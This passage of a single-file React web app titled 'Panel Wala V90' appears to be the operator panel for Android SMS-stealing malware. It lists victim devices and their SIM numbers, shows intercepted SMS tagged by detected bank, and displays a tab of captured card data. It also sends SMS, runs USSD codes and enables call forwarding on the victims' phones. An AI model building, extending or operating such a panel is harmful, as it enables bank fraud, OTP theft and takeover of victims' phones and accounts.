                                <button onClick={() => setShowCallFwdModal(true)} className="bg-white text-gray-800 p-4 rounded-lg shadow hover:bg-gray-50 flex flex-col items-center justify-center space-y-1"><svg className="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg><span className="font-semibold">Call Forwarding</span></button>
                                <button onClick={handleMarkChecked} className="bg-gray-200 text-gray-700 p-3 rounded-lg shadow hover:bg-gray-300 font-medium">Mark Checked</button>
                                <button onClick={refreshData} className="bg-gray-200 text-gray-700 p-3 rounded-lg shadow hover:bg-gray-300 font-medium">Refresh Data</button>
                            </div>
                        )}
                        {activeTab === 'DATA' && (<div className="space-y-4">{data?.info && Object.entries(data.info).map(([k, v]) => (<div key={k} className="bg-white p-3 rounded shadow-sm border-l-4 border-blue-400"><h4 className="text-xs font-bold text-gray-500 uppercase mb-1">{k}</h4><p className="text-sm font-mono break-words">{typeof v === 'object' ? JSON.stringify(v) : String(v)}</p></div>))}{!data?.info && <p className="text-center text-gray-500 py-4">No Additional Info Available</p>}</div>)}
                        {activeTab === 'CARDS' && (<div className="space-y-4">{data?.cards && Object.entries(data.cards).map(([k, v]) => (<div key={k} className="bg-white p-3 rounded shadow-sm border-l-4 border-purple-400"><h4 className="text-xs font-bold text-gray-500 uppercase mb-1">{k}</h4><p className="text-sm font-mono break-words">{typeof v === 'object' ? JSON.stringify(v) : String(v)}</p></div>))}{!data?.cards && <p className="text-center text-gray-500 py-4">No Card Data Available</p>}</div>)}
                    </div>
                    {/* Modals omitted for brevity but logic is identical to full app */}
                    {showSmsModal && (
                        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 backdrop-blur-sm p-4"><div className="bg-white rounded-xl shadow-2xl w-full max-w-sm overflow-hidden"><div className="bg-gradient-to-r from-green-500 to-emerald-600 px-4 py-3 text-white font-bold text-lg flex justify-between items-center"><span>Send SMS</span><button onClick={()=>setShowSmsModal(false)} className="opacity-80 hover:opacity-100">✕</button></div><div className="p-4 space-y-4"><div><label className="block text-xs font-bold text-gray-500 uppercase mb-1">Sim Slot</label><div className="flex space-x-2"><button onClick={()=>setSmsForm({...smsForm, slot:0})} className={`flex-1 py-2 rounded text-sm font-medium border ${smsForm.slot===0 ? 'bg-green-100 border-green-500 text-green-700':'bg-gray-50 border-gray-200'}`}>SIM 1</button><button onClick={()=>setSmsForm({...smsForm, slot:1})} className={`flex-1 py-2 rounded text-sm font-medium border ${smsForm.slot===1 ? 'bg-green-100 border-green-500 text-green-700':'bg-gray-50 border-gray-200'}`}>SIM 2</button></div></div><div><label className="block text-xs font-bold text-gray-500 uppercase mb-1">To Number</label><input type="tel" value={smsForm.to} onChange={e=>setSmsForm({...smsForm, to:e.target.value})} className="w-full border border-gray-300 rounded p-2 focus:border-green-500 focus:outline-none" placeholder="Target mobile number" /></div><div><label className="block text-xs font-bold text-gray-500 uppercase mb-1">Message</label><textarea value={smsForm.msg} onChange={e=>setSmsForm({...smsForm, msg:e.target.value})} rows={3} className="w-full border border-gray-300 rounded p-2 focus:border-green-500 focus:outline-none" placeholder="Type your message..." /></div>{actionStatus && <p className="text-center text-sm font-bold text-green-600">{actionStatus}</p>}<button onClick={handleSendSMS} className="w-full bg-green-600 text-white py-3 rounded font-bold shadow hover:bg-green-700">Send Now</button></div></div></div>
                    )}
                    {/* (Other modals: USSD, Call Fwd - simplified for space, same logic as React component) */}
                    {showUssdModal && <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 backdrop-blur-sm p-4"><div className="bg-white rounded-xl shadow-2xl w-full max-w-md overflow-hidden flex flex-col max-h-[90vh]"><div className="bg-purple-600 px-4 py-3 text-white font-bold text-lg flex justify-between items-center shrink-0"><div className="flex items-center space-x-2"><span>USSD Terminal</span><span className="text-xs bg-purple-700 px-2 py-0.5 rounded animate-pulse">Live</span></div><button onClick={()=>setShowUssdModal(false)} className="opacity-80 hover:opacity-100">✕</button></div><div className="flex-1 overflow-y-auto p-4 bg-gray-50 space-y-3 font-mono text-sm">{ussdHistory.map(msg=><div key={msg.id} className={`flex ${msg.type==='SENT'?'justify-end':'justify-start'}`}><div className={`max-w-[80%] p-3 rounded-lg shadow-sm whitespace-pre-wrap ${msg.type==='SENT'?'bg-purple-100 text-purple-900 rounded-br-none':'bg-white text-gray-800 border border-gray-200 rounded-bl-none'}`}><p>{msg.text}</p></div></div>)}<div ref={ussdEndRef} /></div><div className="p-3 bg-white border-t shrink-0"><div className="flex items-center space-x-2 mb-2"><span className="text-xs font-bold text-gray-500">SIM:</span><div className="flex bg-gray-100 rounded p-0.5"><button onClick={()=>setUssdSlot(0)} className={`px-3 py-1 text-xs rounded ${ussdSlot===0?'bg-white shadow text-purple-600 font-bold':'text-gray-500'}`}>1</button><button onClick={()=>setUssdSlot(1)} className={`px-3 py-1 text-xs rounded ${ussdSlot===1?'bg-white shadow text-purple-600 font-bold':'text-gray-500'}`}>2</button></div></div><div className="flex space-x-2"><input type="text" value={ussdInput} onChange={e=>setUssdInput(e.target.value)} onKeyDown={e=>e.key==='Enter'&&handleSendUssd()} className="flex-1 border border-gray-300 rounded px-3 py-2 focus:border-purple-500 focus:outline-none font-mono" placeholder="Enter code..." autoFocus /><button onClick={handleSendUssd} className="bg-purple-600 text-white px-4 py-2 rounded font-bold hover:bg-purple-700">Send</button></div></div></div></div>}
                    {showCallFwdModal && <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 backdrop-blur-sm p-4"><div className="bg-white rounded-xl shadow-2xl w-full max-w-sm overflow-hidden"><div className="bg-blue-600 px-4 py-3 text-white font-bold text-lg flex justify-between items-center"><span>Call Forwarding</span><button onClick={()=>setShowCallFwdModal(false)} className="opacity-80 hover:opacity-100">✕</button></div><div className="p-4 space-y-4"><div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs h-24 overflow-y-auto border border-gray-700"><p className="font-bold text-gray-500 mb-1 border-b border-gray-700 pb-1">DEVICE STATUS OUTPUT:</p><p className="whitespace-pre-wrap">{callFwdStatus}</p></div><div className="flex space-x-2 bg-gray-100 p-1 rounded"><button onClick={()=>setCallFwdForm({...callFwdForm,enable:true})} className={`flex-1 py-1 rounded text-sm font-medium ${callFwdForm.enable?'bg-white shadow text-blue-600':'text-gray-500'}`}>Enable</button><button onClick={()=>setCallFwdForm({...callFwdForm,enable:false})} className={`flex-1 py-1 rounded text-sm font-medium ${!callFwdForm.enable?'bg-white shadow text-red-600':'text-gray-500'}`}>Disable</button></div><div><label className="block text-xs font-bold text-gray-500 uppercase mb-1">Sim Slot</label><div className="flex space-x-2"><button onClick={()=>setCallFwdForm({...callFwdForm,slot:0})} className={`flex-1 py-2 rounded text-sm font-medium border ${callFwdForm.slot===0?'bg-blue-100 border-blue-500 text-blue-700':'bg-gray-50 border-gray-200'}`}>SIM 1</button><button onClick={()=>setCallFwdForm({...callFwdForm,slot:1})} className={`flex-1 py-2 rounded text-sm font-medium border ${callFwdForm.slot===1?'bg-blue-100 border-blue-500 text-blue-700':'bg-gray-50 border-gray-200'}`}>SIM 2</button></div></div>{callFwdForm.enable && <div><label className="block text-xs font-bold text-gray-500 uppercase mb-1">Forward To Number</label><input type="tel" value={callFwdForm.number} onChange={e=>setCallFwdForm({...callFwdForm,number:e.target.value})} className="w-full border border-gray-300 rounded p-2 focus:border-blue-500 focus:outline-none" placeholder="Enter number" /></div>}<button onClick={handleCallFwd} className="w-full bg-blue-600 text-white py-3 rounded font-bold shadow hover:bg-blue-700">Update Settings</button></div></div></div>}
                </div>
            );
        };

        // 6. SmsViewer
        const SmsViewer = ({ targetUser, onBack }) => {
            const [smsList, setSmsList] = useState([]);
            const [visibleCount, setVisibleCount] = useState(50);
            const [loading, setLoading] = useState(false);
            const [searchQuery, setSearchQuery] = useState('');
            const [debouncedSearch, setDebouncedSearch] = useState('');
            const [selectedBank, setSelectedBank] = useState(null);
            const [selectedSms, setSelectedSms] = useState(null);
            const [deleting, setDeleting] = useState(false);
            const [confirmation, setConfirmation] = useState({ isOpen: false, title: '', message: '', onConfirm: () => {} });
            const loadMoreRef = useRef(null);
            const isGlobal = !targetUser;

            useEffect(() => {
                if (!isGlobal && targetUser) {
                    setLoading(true);
                    const unsubscribe = subscribeToSMS(targetUser.userId, (realtimeMessages) => {
                        setSmsList(currentList => {
                            if (realtimeMessages.length === 0) return [];
                            const oldestRealtime = realtimeMessages[realtimeMessages.length - 1].timestamp;
                            const olderMessages = currentList.filter(m => m.timestamp < oldestRealtime);
                            return [...realtimeMessages, ...olderMessages];
                        });
                        setLoading(false);
                    });
                    return () => unsubscribe();
                } else if (isGlobal) {
                    loadSMS(true);
                }
            }, [targetUser, isGlobal]);

            useEffect(() => { const handler = setTimeout(() => setDebouncedSearch(searchQuery), 250); return () => clearTimeout(handler); }, [searchQuery]);

            const loadSMS = async (isInitial) => {
                if (!isGlobal) return;
                setLoading(true);
                try {
                    if (isInitial) { const all = await fetchGlobalSMS(); setSmsList(all); } 
                    else { setVisibleCount(prev => prev + 50); }
                } catch (err) { console.error(err); } finally { setLoading(false); }
            };

            const loadMoreOlder = async () => {
                if (isGlobal || !targetUser || loading || smsList.length === 0) return;
                setLoading(true);
                try {
                    const lastTimestamp = smsList[smsList.length - 1].timestamp;
                    const older = await fetchOlderSMS(targetUser.userId, lastTimestamp);
                    setSmsList(prev => {
                        const existingKeys = new Set(prev.map(p => p.key));
                        const uniqueOlder = older.filter(o => !existingKeys.has(o.key));
                        return [...prev, ...uniqueOlder];
                    });
                } catch (e) { console.error(e); } finally { setLoading(false); }
            };

            const handleDelete = (sms, e) => {
                e.stopPropagation();
                setConfirmation({
                    isOpen: true, title: 'Are you sure?', message: 'This action will permanently delete this message.',
                    onConfirm: async () => { try { await deleteSMS(sms.userId, sms.key); setSmsList(prev => prev.filter(item => item.key !== sms.key)); } catch (err) { alert("Failed to delete"); } setConfirmation(prev => ({ ...prev, isOpen: false })); }
                });
            };

            const handleDeleteAll = () => {
                const isGlobalMode = isGlobal;
                const msg = isGlobalMode ? "This will delete ALL SMS messages for ALL users. This action is irreversible." : `This will delete ALL SMS for user: ${targetUser?.Brand}.`;
                setConfirmation({
                    isOpen: true, title: 'Are you sure?', message: msg,
                    onConfirm: async () => { setDeleting(true); try { if (isGlobalMode) { await deleteAllGlobalSMS(); } else if (targetUser) { await deleteAllSMS(targetUser.userId); } setSmsList([]); } catch (err) { alert("Failed to delete."); } finally { setDeleting(false); setConfirmation(prev => ({ ...prev, isOpen: false })); } }
                });
            };

            const filteredList = useMemo(() => {
                let result = smsList;
                if (debouncedSearch) { const lowerQ = debouncedSearch.toLowerCase(); result = result.filter(sms => sms.body.toLowerCase().includes(lowerQ) || sms.sender.toLowerCase().includes(lowerQ)); }
                if (selectedBank) { result = result.filter(sms => detectBanks(sms.sender + " " + sms.body).includes(selectedBank)); }
                return result;
            }, [smsList, debouncedSearch, selectedBank]);

            const displayedList = isGlobal ? filteredList.slice(0, visibleCount) : filteredList;
            const bankStats = useMemo(() => { const stats = new Map(); smsList.forEach(sms => { detectBanks(sms.sender + " " + sms.body).forEach(bank => stats.set(bank, (stats.get(bank) || 0) + 1)); }); return Array.from(stats.entries()).map(([name, count]) => ({ name, count })).sort((a, b) => b.count - a.count); }, [smsList]);

            useEffect(() => { if (loading) return; const observer = new IntersectionObserver(entries => { if (entries[0].isIntersecting) { if (isGlobal) setVisibleCount(c => c + 50); else loadMoreOlder(); } }); if (loadMoreRef.current) observer.observe(loadMoreRef.current); return () => observer.disconnect(); }, [loading, isGlobal, smsList]);

            const HighlightedText = ({ text, highlight }) => { if (!highlight) return <span>{text}</span>; const parts = text.split(new RegExp(`(${highlight})`, 'gi')); return (<span>{parts.map((part, i) => part.toLowerCase() === highlight.toLowerCase() ? <span key={i} className="bg-yellow-200 text-gray-900">{part}</span> : <span key={i}>{part}</span>)}</span>); };

            return (
                <div className="flex flex-col h-screen bg-[#e5ddd5]">
                    <header className="bg-app-green text-white shadow-md z-20">
                        <div className="flex items-center justify-between px-4 py-3">
                            <div className="flex items-center space-x-3"><button onClick={onBack} className="hover:bg-green-700 p-1 rounded"><svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg></button><div><h1 className="text-lg font-bold leading-tight">{isGlobal ? "Global SMS Viewer" : "SMS Viewer"}</h1>{isGlobal ? <p className="text-xs text-green-100">All Users</p> : <div className="flex items-center space-x-2 mt-0.5"><span className={`w-2 h-2 rounded-full ${targetUser?.Status === 'Online' ? 'bg-green-400 animate-pulse' : 'bg-gray-400'}`}></span><p className="text-xs text-green-100">{targetUser?.Brand} ({targetUser?.DeviceId}) - {targetUser?.Status}</p></div>}</div></div>
                            <button onClick={handleDeleteAll} disabled={deleting || smsList.length === 0} className="text-white hover:bg-green-700 p-2 rounded disabled:opacity-50"><svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>
                        </div>
                        <div className="bg-white px-2 py-2 shadow-inner"><div className="relative"><div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none"><svg className="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg></div><input type="text" className="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-lg leading-5 bg-gray-100 placeholder-gray-500 text-gray-900 focus:outline-none focus:bg-white focus:ring-1 focus:ring-app-green sm:text-sm transition" placeholder="Search sender or body..." value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} /></div></div>
                    </header>
                    <BankChips stats={bankStats} selectedBank={selectedBank} onSelectBank={setSelectedBank} />
                    <div className="flex-1 overflow-y-auto p-2 sm:p-4 space-y-3 relative" id="sms-container">
                        {displayedList.length === 0 && !loading && (<div className="flex flex-col items-center justify-center h-48 text-gray-500"><p>No Messages Found</p></div>)}
                        {displayedList.map((sms) => (
                            <div key={sms.key + sms.userId} className="bg-white rounded-lg shadow-sm p-3 border-l-4 border-app-green relative cursor-pointer active:bg-gray-50 transition-colors" onClick={() => setSelectedSms(sms)}>
                                <div className="flex justify-between items-start mb-1"><div className="flex flex-col"><h3 className="font-bold text-app-green text-sm sm:text-base"><HighlightedText text={sms.sender} highlight={debouncedSearch} /></h3>{isGlobal && <span className="text-[10px] text-gray-500 font-mono">User: {sms.userId.substring(0, 6)}...</span>}</div><span className="text-[10px] sm:text-xs text-gray-400 whitespace-nowrap ml-2">{new Date(sms.timestamp).toLocaleString(undefined, { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })}</span></div><p className="text-gray-700 text-xs sm:text-sm line-clamp-3 mb-2 font-sans"><HighlightedText text={sms.body} highlight={debouncedSearch} /></p><div className="flex justify-between items-center border-t pt-2 border-gray-100"><div className="flex space-x-1">{detectBanks(sms.sender + " " + sms.body).map(b => <span key={b} className="text-[9px] bg-gray-100 text-gray-600 px-1.5 py-0.5 rounded border border-gray-200">{b}</span>)}</div><button onClick={(e) => handleDelete(sms, e)} className="p-1.5 text-gray-400 hover:text-red-500 rounded-full hover:bg-red-50 transition-colors"><svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button></div>
                            </div>
                        ))}
                        <div ref={loadMoreRef} className="h-10 flex justify-center items-center">{loading && <svg className="animate-spin h-5 w-5 text-app-green" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>}</div>
                    </div>
                    <SmsModal sms={selectedSms} onClose={() => setSelectedSms(null)} />
                    {confirmation.isOpen && (
                        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm p-4"><div className="bg-white rounded-lg shadow-xl p-6 w-full max-w-sm transform transition-all scale-100"><h3 className="text-lg font-bold text-gray-800 mb-2">{confirmation.title}</h3><p className="text-gray-600 mb-6 text-sm whitespace-pre-line">{confirmation.message}</p><div className="flex justify-end space-x-3"><button onClick={() => setConfirmation({ ...confirmation, isOpen: false })} className="px-4 py-2 text-gray-600 hover:bg-gray-100 rounded font-medium transition-colors">Cancel</button><button onClick={confirmation.onConfirm} className="px-4 py-2 bg-red-600 text-white rounded font-medium hover:bg-red-700 shadow transition-colors">Delete</button></div></div></div>
                    )}
                </div>
            );
        };

        // 7. Home
        const Home = ({ onSelectUserForSMS, onSelectUserForData, onGlobalSMS, onGlobalData }) => {
            const [devices, setDevices] = useState([]);
            const [loading, setLoading] = useState(false);
            const [searchQuery, setSearchQuery] = useState('');
            const [filter, setFilter] = useState('ALL');
            const [showAdminModal, setShowAdminModal] = useState(false);
            const [isDeleting, setIsDeleting] = useState(false);
            const [confirmation, setConfirmation] = useState({ isOpen: false, title: '', message: '', onConfirm: () => {} });

            useEffect(() => { setLoading(true); const unsubscribe = subscribeToDevices((updatedDevices) => { setDevices(updatedDevices); setLoading(false); }); return () => unsubscribe(); }, []);

            const filteredDevices = useMemo(() => {
                let result = devices;
                if (filter === 'ONLINE') result = result.filter(d => d.Status === 'Online');
                if (filter === 'OFFLINE') result = result.filter(d => d.Status !== 'Online');
                if (searchQuery) {
                    const q = searchQuery.toLowerCase();
                    result = result.filter(d => (d.Brand && d.Brand.toLowerCase().includes(q)) || (d.DeviceId && d.DeviceId.toLowerCase().includes(q)) || (d.sim1Number && d.sim1Number.includes(q)) || (d.sim2Number && d.sim2Number.includes(q)));
                }
                return result;
            }, [devices, filter, searchQuery]);

            const totalCount = devices.length;
            const onlineCount = devices.filter(d => d.Status === 'Online').length;
            const offlineCount = devices.filter(d => d.Status !== 'Online').length;

            const handleDeleteUser = (user) => {
                setConfirmation({ isOpen: true, title: 'Are you sure?', message: `This action will permanently delete ALL data for User: ${user.Brand} (${user.DeviceId}).`, onConfirm: async () => { setIsDeleting(true); try { await deleteSingleUser(user.userId); } catch (error) { alert("Failed to delete user."); } finally { setIsDeleting(false); setConfirmation(prev => ({ ...prev, isOpen: false })); } } });
            };
            const handleDeleteAllOffline = () => {
                setConfirmation({ isOpen: true, title: 'Are you sure?', message: `This action will permanently delete ALL ${offlineCount} offline users.`, onConfirm: async () => { setIsDeleting(true); try { const offlineIds = devices.filter(d => d.Status !== 'Online').map(d => d.userId); await deleteOfflineUsers(offlineIds); } catch (error) { alert("Failed to delete offline users."); } finally { setIsDeleting(false); setConfirmation(prev => ({ ...prev, isOpen: false })); } } });
            };
            const handleUserClick = (user, action) => {
                if (!user.checked) { markUserAsChecked(user.userId); setDevices(prev => prev.map(d => d.userId === user.userId ? { ...d, checked: true } : d)); }
                if (action === 'SMS') onSelectUserForSMS(user);
                if (action === 'DATA') onSelectUserForData(user);
            };

            return (
                <div className="h-full flex flex-col bg-gray-100 overflow-hidden">
                    <div className="flex-none bg-app-green text-white p-4 shadow-md z-20">
                        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                            <div className="flex items-center gap-2"><h1 className="text-xl font-bold">Panel Wala V90</h1><span className="text-[10px] bg-green-700 px-2 py-0.5 rounded text-green-100 font-mono">Live</span></div>
                            <div className="flex flex-wrap gap-2 text-xs font-mono"><span className="px-2 py-1 bg-white/20 rounded">Total: {totalCount}</span><span className="px-2 py-1 bg-green-500 rounded">Online: {onlineCount}</span><span className="px-2 py-1 bg-gray-600 rounded">Offline: {offlineCount}</span></div>
                            <div className="flex flex-wrap gap-2"><button onClick={onGlobalSMS} className="text-xs bg-blue-600 text-white px-3 py-1.5 rounded font-bold shadow hover:bg-blue-700">View All SMS</button><button onClick={onGlobalData} className="text-xs bg-indigo-600 text-white px-3 py-1.5 rounded font-bold shadow hover:bg-indigo-700">View All Data</button><button onClick={() => setShowAdminModal(true)} className="text-xs bg-white text-app-green px-3 py-1.5 rounded font-bold shadow hover:bg-gray-100">Update Admin #</button><button onClick={handleDeleteAllOffline} disabled={isDeleting || offlineCount === 0} className="text-xs bg-red-500 text-white px-3 py-1.5 rounded font-bold shadow hover:bg-red-600 disabled:opacity-50">Del Offline</button></div>
                        </div>
                        <div className="mt-4 relative"><input type="text" placeholder="Search Name, Device ID, or Phone Number..." className="w-full pl-10 pr-4 py-2 rounded-lg text-gray-900 focus:outline-none shadow-inner" value={searchQuery} onChange={e => setSearchQuery(e.target.value)} /><svg className="w-5 h-5 text-gray-400 absolute left-3 top-2.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg></div>
                        <div className="flex mt-4 gap-4 text-sm font-medium border-b border-white/20 pb-1 overflow-x-auto"><button onClick={() => setFilter('ALL')} className={`${filter === 'ALL' ? 'text-white border-b-2 border-white' : 'text-green-200'} pb-1 whitespace-nowrap`}>All Users</button><button onClick={() => setFilter('ONLINE')} className={`${filter === 'ONLINE' ? 'text-white border-b-2 border-white' : 'text-green-200'} pb-1 whitespace-nowrap`}>Online</button><button onClick={() => setFilter('OFFLINE')} className={`${filter === 'OFFLINE' ? 'text-white border-b-2 border-white' : 'text-green-200'} pb-1 whitespace-nowrap`}>Offline</button></div>
                    </div>
                    {(loading || isDeleting) && (<div className="flex-none w-full bg-gray-200 h-1"><div className="bg-blue-500 h-1 animate-pulse w-full"></div></div>)}
                    <div className="flex-1 overflow-y-auto p-4 relative">
                        {filteredDevices.length === 0 && !loading ? (<div className="text-center text-gray-400 mt-10">No users found.</div>) : (
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 pb-10">{filteredDevices.map(device => (
                                <div key={device.userId} className="bg-white rounded-lg shadow border border-gray-100 p-4 relative hover:shadow-md transition-shadow">
                                    <div className="flex justify-between items-start mb-2"><div className="flex items-center gap-2"><span className={`w-3 h-3 rounded-full ${device.Status === 'Online' ? 'bg-green-500 animate-pulse' : 'bg-gray-400'}`}></span><h3 className="font-bold text-gray-800 truncate max-w-[150px]">{device.Brand}</h3>{device.checked && (<span className="text-blue-500"><svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"/></svg></span>)}</div><span className="text-[10px] text-gray-400 font-mono">{device.Status}</span></div>
                                    <div className="text-sm text-gray-600 space-y-1 mb-4"><p className="flex justify-between"><span className="text-gray-400">ID:</span> <span className="font-mono text-xs truncate max-w-[120px]" title={device.DeviceId}>{device.DeviceId}</span></p>{device.sim1Number && <p className="flex justify-between"><span className="text-gray-400">SIM 1:</span> <span className="font-mono">{device.sim1Number}</span></p>}{device.sim2Number && <p className="flex justify-between"><span className="text-gray-400">SIM 2:</span> <span className="font-mono">{device.sim2Number}</span></p>}{device.lastSeen && <p className="text-[10px] text-gray-400 text-right mt-1">Last seen: {new Date(device.lastSeen).toLocaleDateString()}</p>}</div>
                                    <div className="grid grid-cols-3 gap-2 mt-2"><button onClick={() => handleUserClick(device, 'SMS')} className="bg-app-green text-white py-1.5 rounded text-xs font-semibold hover:bg-green-700 transition-colors">View SMS</button><button onClick={() => handleUserClick(device, 'DATA')} className="bg-blue-500 text-white py-1.5 rounded text-xs font-semibold hover:bg-blue-600 transition-colors">View Data</button><button onClick={() => handleDeleteUser(device)} className="bg-red-100 text-red-600 py-1.5 rounded text-xs font-semibold hover:bg-red-200 transition-colors">Delete</button></div>
                                </div>))}</div>
                        )}
                    </div>
                    {showAdminModal && <AdminNumberModal onClose={() => setShowAdminModal(false)} />}
                    {confirmation.isOpen && (<div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm p-4"><div className="bg-white rounded-lg shadow-xl p-6 w-full max-w-sm transform transition-all scale-100"><h3 className="text-lg font-bold text-gray-800 mb-2">{confirmation.title}</h3><p className="text-gray-600 mb-6 text-sm whitespace-pre-line">{confirmation.message}</p><div className="flex justify-end space-x-3"><button onClick={() => setConfirmation({ ...confirmation, isOpen: false })} className="px-4 py-2 text-gray-600 hover:bg-gray-100 rounded font-medium transition-colors">Cancel</button><button onClick={confirmation.onConfirm} className="px-4 py-2 bg-red-600 text-white rounded font-medium hover:bg-red-700 shadow transition-colors">Delete</button></div></div></div>)}
                </div>
            );
        };

        // 8. Login
        const Login = ({ onLoginSuccess }) => {
            const [key, setKey] = useState('');
            const [error, setError] = useState('');
            const [loading, setLoading] = useState(false);
            useEffect(() => { const storedKey = localStorage.getItem('panel_user_key'); if (storedKey) setKey(storedKey); }, []);
            useEffect(() => { if (key.length === 6) handleLogin(key); }, [key]);
            const handleLogin = async (inputKey) => {
                if (loading) return; setLoading(true); setError('');
                try { const result = await loginUser(inputKey); if (result.success && result.user) { localStorage.setItem('panel_user_key', inputKey); onLoginSuccess(result.user); } else { setError(result.message || 'Login Failed'); } } catch (err) { setError('An unexpected error occurred'); } finally { setLoading(false); }
            };
            const handlePaste = async () => {
                try { const text = await navigator.clipboard.readText(); if (text) { setKey(text.trim().substring(0, 6)); setError(''); } } catch (e) { setError("Use Ctrl+V or type the key manually."); setTimeout(() => setError(""), 4000); }
            };
            return (
                <div className="min-h-screen flex items-center justify-center bg-gray-100 p-4">
                    <div className="max-w-md w-full bg-white rounded-xl shadow-lg p-8">
                        <div className="text-center mb-8"><div className="bg-app-green w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4"><svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg></div><h2 className="text-2xl font-bold text-gray-800">Panel Wala V90</h2><p className="text-gray-500 text-sm mt-1">Enter Admin Key</p></div>
                        <div className="space-y-6"><div className="relative"><input type="text" maxLength={6} value={key} onChange={(e) => { setKey(e.target.value.replace(/[^0-9a-zA-Z]/g, '')); setError(''); }} placeholder="ENTER KEY" className="w-full text-center text-3xl tracking-widest font-mono py-3 border-b-2 border-gray-300 focus:border-app-green focus:outline-none transition-colors uppercase" /><button onClick={handlePaste} className="absolute right-0 top-1/2 transform -translate-y-1/2 text-xs text-app-green hover:underline font-medium">PASTE</button></div>{error && (<div className="bg-red-50 text-red-600 p-3 rounded text-sm text-center border border-red-100 break-words">{error}</div>)}{loading && (<div className="flex justify-center"><svg className="animate-spin h-6 w-6 text-app-green" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg></div>)}</div>
                        <div className="mt-8 text-center text-xs text-gray-400">Panel Wala V90 Dashboard v90.5 (Single File)</div>
                    </div>
                </div>
            );
        };

        // 9. App (Main Controller)
        const App = () => {
            const [appState, setAppState] = useState({ user: null, currentScreen: 'LOGIN', selectedTargetUser: null });
            const handleLoginSuccess = (user) => setAppState({ ...appState, user, currentScreen: 'HOME' });
            const handleSelectUserForSMS = (device) => setAppState({ ...appState, selectedTargetUser: device, currentScreen: 'SMS_VIEW' });
            const handleSelectUserForData = (device) => setAppState({ ...appState, selectedTargetUser: device, currentScreen: 'DATA_VIEW' });
            const handleGlobalSMS = () => setAppState({ ...appState, currentScreen: 'GLOBAL_SMS', selectedTargetUser: null });
            const handleGlobalData = () => setAppState({ ...appState, currentScreen: 'GLOBAL_DATA', selectedTargetUser: null });
            const handleBackToHome = () => setAppState({ ...appState, selectedTargetUser: null, currentScreen: 'HOME' });

            const renderScreen = () => {
                switch (appState.currentScreen) {
                    case 'LOGIN': return <Login onLoginSuccess={handleLoginSuccess} />;
                    case 'HOME': return <Home onSelectUserForSMS={handleSelectUserForSMS} onSelectUserForData={handleSelectUserForData} onGlobalSMS={handleGlobalSMS} onGlobalData={handleGlobalData} />;
                    case 'SMS_VIEW': if (!appState.selectedTargetUser) return null; return <SmsViewer targetUser={appState.selectedTargetUser} onBack={handleBackToHome} />;
                    case 'GLOBAL_SMS': return <SmsViewer targetUser={null} onBack={handleBackToHome} />;
